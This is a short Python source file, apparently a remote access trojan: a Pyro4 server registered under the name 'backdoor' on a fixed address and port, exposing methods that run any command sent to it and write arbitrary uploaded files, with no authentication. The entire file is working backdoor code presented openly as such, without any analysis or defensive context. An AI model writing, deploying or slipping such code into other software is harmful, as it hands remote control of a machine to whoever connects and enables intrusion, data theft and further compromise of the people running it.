import Pyro4
from subprocess import run, PIPE

@Pyro4.expose
@Pyro4.behavior(instance_mode="single")

class RAT(object):
    def execute(self, cmd):
        result = run(cmd.split(), stdout=PIPE, stderr=PIPE)
        return (result.stdout, result.stderr)
    def upload(self, filename, data):
        open(filename, 'wb').write(data)
    
def main():
    Pyro4.Daemon.serveSimple({RAT: 'backdoor'},
                             host = '192.168.1.1',
                             port = 12345,
                             ns = False)


if __name__ == '__main__':
    main()
